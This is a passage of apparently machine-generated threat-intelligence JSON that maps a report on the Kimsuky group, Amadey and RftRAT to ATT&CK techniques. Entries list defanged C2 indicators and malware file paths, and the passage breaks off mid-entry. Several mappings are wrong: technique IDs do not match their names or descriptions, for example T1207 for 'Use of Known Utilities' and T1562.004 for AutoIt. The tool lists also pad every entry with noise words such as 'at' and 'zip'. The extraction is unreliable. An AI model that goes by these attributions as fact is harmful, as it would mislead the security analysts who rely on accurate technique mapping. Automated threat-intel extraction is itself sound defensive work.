        "description": "Amadey malware is executed through the Rundll32.exe process",
        "confidence_score": 0.718,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.222,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Rundll32.exe"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Rundll32.exe",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7bad04b0-55df-4a1d-b81d-4bf3e6c9a047",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Spear Phishing Attack",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "Kimsuky Group uses spear phishing to gain initial access",
        "confidence_score": 0.716,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "phishing email"
        ],
        "tools": [
          "rundll32",
          "LNK Malware",
          "at",
          "metasploit",
          "Rundll32",
          "zip",
          "sc",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e25fffd8-d45e-4e53-b217-79f57abed0e9",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "UAC Bypass",
        "attack_id": "T1548.002",
        "tactic": "Privilege Escalation",
        "description": "RftRAT uses the ICMLuaUtil interface of the CMSTPLUACOM component to bypass UAC and execute itself as administrator",
        "confidence_score": 0.716,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.62,
          "description_detail": 0.391,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "ICMLuaUtil",
          "CMSTPLUACOM",
          "%APPDATA%\\asc\\t1.pb"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8366ec61-9eb3-4893-b9a0-443570b3e3c9",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "Detected use of AutoIt for potential malicious script execution",
        "confidence_score": 0.714,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.192,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "autoit"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
          "reg",
          "AutoIt",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d535e747-4fcb-4f63-aad9-0dccc51be158",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Scripting",
        "attack_id": "T1064",
        "tactic": "Execution",
        "description": "The BAT and VBS scripts inside can either be used for executing other scripts or contain an Infostealer responsible for collecting and exfiltrating information from the infected system.",
        "confidence_score": 0.713,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.524,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "BAT scripts",
          "VBS scripts",
          "Infostealer"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "BAT",
          "sc",
          "VBS",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "801c2cec-64bc-4ae9-9cfe-073ee39c118c",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Use of Known Utilities",
        "attack_id": "T1207",
        "tactic": "Execution",
        "description": "The Kimsuky group uses a dropper to install Amadey. Amadey is a malware that began being sold on illegal forums. It is a downloader that installs additional malware from the C&C server.",
        "confidence_score": 0.711,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.556,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Amadey",
          "dropper"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3038f110-af85-4b9c-bb3d-8913b5c0ee48",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "AutoIt",
        "attack_id": "T1562.004",
        "tactic": "Execution",
        "description": "Kimsuky group used AutoIt to create malware and inject RftRAT",
        "confidence_score": 0.71,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.23,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "AutoIt"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "AutoIt",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5edabb76-550d-41aa-b8be-f24c5d4a0b3d",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Keylogger",
        "attack_id": "T1056",
        "tactic": "Credential Access",
        "description": "Kimsuky Group uses keylogger to capture credentials",
        "confidence_score": 0.709,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "keylogger"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "Keylogger",
          "NET",
          "ping",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5e3bfb36-7b01-4a14-bdf7-fce3286e955d",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "Amadey malware is loaded and executed through the Rundll32.exe process, then injected into the iexplore.exe process",
        "confidence_score": 0.695,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.405,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Rundll32.exe",
          "iexplore.exe",
          "svchost.exe"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Rundll32.exe",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "6bb52599-f1b6-468f-93b8-f2c2364fd936",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Data Exfiltration",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "The Kimsuky group ultimately uses RDP or installs Google\u2019s Chrome Remote Desktop to exfiltrate information from the infected system.",
        "confidence_score": 0.694,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.437,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RDP",
          "Google\u2019s Chrome Remote Desktop"
        ],
        "tools": [
          "rundll32",
          "RDP",
          "at",
          "metasploit",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit",
          "Google\u2019s Chrome Remote Desktop"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2d68ae5a-36b1-4e4e-82c4-f0be161cb123",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Domain Generation Algorithms",
        "attack_id": "T1583.003",
        "tactic": "Command and Control",
        "description": "Amadey uses Domain Generation Algorithms (DGA) to scan for antivirus software",
        "confidence_score": 0.689,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.29,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "DGA"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "af44da62-de82-4cb6-b693-bfed89866e96",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "Detected Phishing activity via NLP pattern matching",
        "confidence_score": 0.684,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "d3791107-b654-40eb-86f2-dc767d0e9c59",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Masquerading",
        "attack_id": "T1036",
        "tactic": "Defense Evasion",
        "description": "Threat actor installed a legitimate AutoIt executable file and a compiled AutoIt script in the infected system",
        "confidence_score": 0.681,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.391,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "AutoIt executable"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
          "reg",
          "AutoIt",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "94877a6c-ee97-4ac4-a3d6-1123da9a7d7a",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "RftRAT instances were packed with VMP and contained the keyword \"RFTServer\" in the decrypted strings",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RFTServer",
          "VMP"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "VMP",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "4b74adbe-8488-47a3-81ff-ac604026a2ec",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Data Exfiltration",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "RftRAT collects basic information about the infected system and sends it to the C&C server",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%APPDATA%\\asc\\t1.pb",
          "hxxps://prohomepage[.]net/index.php"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "afd57284-a0cf-44e7-aab0-8617a00447c8",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Keylogging",
        "attack_id": "T1056",
        "tactic": "Credential Access",
        "description": "The keylogger is installed in the path %ALLUSERSPROFILE%\\startup\\NsiService.exe and monitors key input from the user",
        "confidence_score": 0.68,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%ALLUSERSPROFILE%\\startup\\NsiService.exe",
          "%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "Keylogger",
          "NET",
          "ping",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "75a80b89-feab-4a56-bd38-44e17d6822ba",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Mimikatz",
        "attack_id": "T1003",
        "tactic": "Credential Access",
        "description": "Kimsuky Group uses Mimikatz to capture credentials",
        "confidence_score": 0.679,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Mimikatz"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ad5b5479-6570-45ca-9437-dcbf7d480676",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Rundll32",
        "attack_id": "T1085",
        "tactic": "Defense Evasion",
        "description": "Kimsuky Group uses Rundll32 to evade defenses",
        "confidence_score": 0.679,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "rundll32.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "17afcda8-7e27-4e19-a695-718d05e3eea7",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Data Encoding",
        "attack_id": "T1132",
        "tactic": "Command and Control",
        "description": "Amadey sends system information collected from the infected system to the C&C server using HTTP requests",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "HTTP request"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "0392ad94-9931-4055-af77-0117b16319b4",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Metasploit",
        "attack_id": "T1204",
        "tactic": "Exploitation for Client Execution",
        "description": "Kimsuky Group uses Metasploit for exploitation",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Metasploit"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "76e6827f-3578-42c3-a7fe-7f8ba8425f6f",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "PowerShell",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Kimsuky Group uses PowerShell for execution",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.138,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c513f7e3-d9a4-41cd-807b-bd4b4c1bc3da",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Command and Control",
        "attack_id": "T1071",
        "tactic": "Command and Control",
        "description": "RftRAT communicates with the C&C server to receive commands and send data",
        "confidence_score": 0.675,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "hxxps://prohomepage[.]net/index.php",
          "45.76.93[.]204:56001",
          "%APPDATA%\\asc\\t1.pb"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "2100b081-c909-4ce9-862f-dc8cefff85ab",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Info Stealing",
        "attack_id": "T1005",
        "tactic": "Credential Access",
        "description": "Malware for collecting information from web browsers were created in the %ALLUSERSPROFILE%\\semantec\\ path",
        "confidence_score": 0.673,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%ALLUSERSPROFILE%\\semantec\\GBIA.exe",
          "%ALLUSERSPROFILE%\\semantec\\GBIC.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Info Stealer",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f1596fd1-d7cd-4409-a812-1d234b946839",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Process Injection",
        "attack_id": "T1055",
        "tactic": "Defense Evasion",
        "description": "The injector injects ipcheck.dll into the explorer.exe and runtimebroker.exe processes",
        "confidence_score": 0.668,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.268,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%ALLUSERSPROFILE%\\semantec\\taskhosts.exe",
          "ipcheck.dll"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit",
          "Injector"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3230d900-4db8-4e99-9ba0-677d99a6f984",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "PowerShell and Metasploit were detected as tools used by the threat actor",
        "confidence_score": 0.667,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.261,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe",
          "metasploit"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3019e43e-718e-4079-a914-de6ab0db1d3c",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected use of PowerShell and Metasploit for potential malicious command execution",
        "confidence_score": 0.664,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.238,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe",
          "metasploit"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "74b28720-2873-4c77-b521-c10966f8b9a1",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Execution through API",
        "attack_id": "T1106",
        "tactic": "Execution",
        "description": "RftRAT writes the received commands to the path %APPDATA%\\asc\\t1.pb before decrypting them",
        "confidence_score": 0.663,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%APPDATA%\\asc\\t1.pb"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "4fbb19b9-8cf5-401e-bf27-ef2b98c52649",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "UAC Bypass",
        "attack_id": "T1548.002",
        "tactic": "Privilege Escalation",
        "description": "ICMLuaUtil used to bypass UAC",
        "confidence_score": 0.662,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.115,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "ICMLuaUtil"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "ICMLuaUtil",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8489b1d8-530a-4aad-8688-f2251c2997ac",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Process Hollowing",
        "attack_id": "T1093",
        "tactic": "Defense Evasion",
        "description": "RftRAT can receive commands from the C&C server and execute them",
        "confidence_score": 0.66,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.253,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RftRAT"
        ],
        "tools": [
          "RftRAT",
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "149ce1a0-45b6-4a74-851c-8921b3439121",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Credential Access",
        "attack_id": "T1003",
        "tactic": "Credential Access",
        "description": "Mimikatz was detected as a tool used by the threat actor",
        "confidence_score": 0.658,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.238,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "mimikatz.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "cbd0593e-c074-4ff2-bd9c-23e24f4772af",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Command and Control",
        "attack_id": "T1071",
        "tactic": "Command and Control",
        "description": "The infected system's information is transmitted to the C&C server",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.23,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C&C server"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "db44028a-4e54-4510-a0e9-f289b1fc9131",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Remote Desktop Protocol",
        "attack_id": "T1021",
        "tactic": "Lateral Movement",
        "description": "The threat actor used RDP for information theft",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RDP Wrapper",
          "3389"
        ],
        "tools": [
          "rundll32",
          "RDP",
          "at",
          "metasploit",
          "Rundll32",
          "zip",
          "sc",
          "PowerShell",
          "Mimikatz",
          "mimikatz",
